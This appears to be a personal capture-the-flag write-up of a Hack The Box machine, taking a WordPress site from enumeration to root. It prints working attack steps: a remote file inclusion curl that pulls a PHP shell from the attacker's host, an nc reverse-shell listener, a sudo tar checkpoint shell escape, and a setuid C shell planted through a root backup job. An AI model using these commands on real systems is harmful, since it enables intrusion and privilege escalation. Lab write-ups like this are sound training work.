
Target : 10.129.1.185

Started off with the port scan : 80

Enumerating webservice running in port 80

**Directory Bruteforcing using gobuster**

`gobuster dir -u "http://10.129.1.185/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
.hta                 (Status: 403) [Size: 291]
.htpasswd            (Status: 403) [Size: 296]
.htaccess            (Status: 403) [Size: 296]
index.html           (Status: 200) [Size: 10766]
robots.txt           (Status: 200) [Size: 208]
server-status        (Status: 403) [Size: 300]
webservices          (Status: 301) [Size: 318] [--> http://10.129.1.185/webservices/]
```

robots.txt revealed further paths 

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

monstra-3.0.4 is vulnerable authenticated file upload to RCE (CVE-2025-69906)

But to exploit this, we need credentials, looked for default credential and found it is 
`admin:admin`

Let's do directory bruteforcing again to gather more information

```
.gitignore           (Status: 200) [Size: 518]
.hta                 (Status: 403) [Size: 317]
.htpasswd            (Status: 403) [Size: 322]
.htaccess            (Status: 403) [Size: 322]
admin                (Status: 301) [Size: 338] [--> http://10.129.1.185/webservices/monstra-3.0.4/admin/]
backups              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/backups/]
boot                 (Status: 301) [Size: 337] [--> http://10.129.1.185/webservices/monstra-3.0.4/boot/]
engine               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/engine/]
favicon.ico          (Status: 200) [Size: 1150]
index.php            (Status: 200) [Size: 4366]
libraries            (Status: 301) [Size: 342] [--> http://10.129.1.185/webservices/monstra-3.0.4/libraries/]
plugins              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/plugins/]
public               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/public/]
robots.txt           (Status: 200) [Size: 92]
sitemap.xml          (Status: 200) [Size: 730]
storage              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/storage/]
tmp                  (Status: 301) [Size: 336] [--> http://10.129.1.185/webservices/monstra-3.0.4/tmp/]
```

And this is a deadend.

`gobuster dir -u "http://10.129.1.185/webservices/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
.htpasswd            (Status: 403) [Size: 308]
.hta                 (Status: 403) [Size: 303]
.htaccess            (Status: 403) [Size: 308]
wp                   (Status: 301) [Size: 321] [--> http://10.129.1.185/webservices/wp/]
```

And it is running wordpress 

`wpscan --url "http://10.129.1.185/webservices/wp --enumerate p --plugins-detection mixed"`                   (this revealed plugins used in wordpress)

![](../Pasted%20image%2020260709105808.png)

gwolle-gb (2.3.10) is vulnerable to Remote code inclusion

![](../Pasted%20image%2020260709105922.png)

To exploit this:

I have started a python service to check, how the application includes remote files. and noticed that it appends `wp-load.php` in end of file name. So i created my malicious php file like `shell.phpwp-load.php` and started a python server to share the file.

Started the listener at 1234 : `nc -lvnp 1234`

`curl "http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.241:8080/shell.php" -i`

Got shell as `www-data` user

`sudo -l`  revealed www-data can execute `/bin/tar` as user `onuma`

`sudo -u onuma /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

Got shell as user `onuma`

`user.txt : 56573a5809df1c076b362963c143bbb0`

Root Escalation:

```
$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```
 
got wordpress database password using wp-config.php : `w0rdpr3$$d@t@b@$3@cc3$$`

![](../Pasted%20image%2020260709113654.png)

wpadmin : `$P$BBU0yjydBz9THONExe2kPEsvtjStGe1`

got the password hash for the wpadmin using mysql

Escalation path : `systemctl list-timers --no-pager`  (backuperer.service executes every 5 min)

![](../Pasted%20image%2020260709120722.png)

and found the location of the file using find.

```
onuma@TartarSauce:/tmp$ find / -name "backuperer.service" 2>/dev/null
/lib/systemd/system/backuperer.service
```

and the service file executes : `/usr/sbin/backuperer`

Exploitation:

``` #exploit.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main(void)
{
setuid(0); setgid(0); system("/bin/sh");
}

```

![](../Pasted%20image%2020260709125035.png)

Step 01: Create an exploit and compile using gcc as 32 bit, as our target is 32 bit machine and set suid bit as root

`gcc -m32 -static exploit.c -o shell`

`chmod +s shell`             (as root user)

Step 02 : Create the same directory structure

`mkdir -p var/www/html`

Step 03: Move the binary and make the tar file.

`mv shell var/www/html`
`tar -zcvf setuid.tar.gz var/ `

Step 04: Share the file through hosting a server to /var/tmp in target machine

`python3 -m http.server 8081`
`wget http://10.10.16.241:8081/setuid.tar.gz`

And check with `systemctl list-timers`

if a temp file created in .85b12933f8a12cb8bddbe578229ae6dd93467f7c (like this) then copy the tar file and change into this name .85b12933f8a12cb8bddbe578229ae6dd93467f7c

`cp setuid.tar.gz .85b12933f8a12cb8bddbe578229ae6dd93467f7c`

it will be extracted as root and create a new folder in /var/tmp/check

![](../Pasted%20image%2020260709132759.png)

And got the shell as root.

```
# cat root.txt
12952d8de71f303fc6dc35fb849e6bde
```


**To be noted:**

1. Struggled to find the initial foothold, especially haven't enumerated /webservices directory, so i missed identifying wordpress and its plugin. Instead i ran into the authenticated file upload to RCE, but unfortunately that's a rabbit hole
2. Easily escalated as user : onuma
3. And for root escalation, identified the intended path, but the problem is i don't know how to exploit, so i took a peek into the walkthrough, understood everything, created an exploit, and it worked. 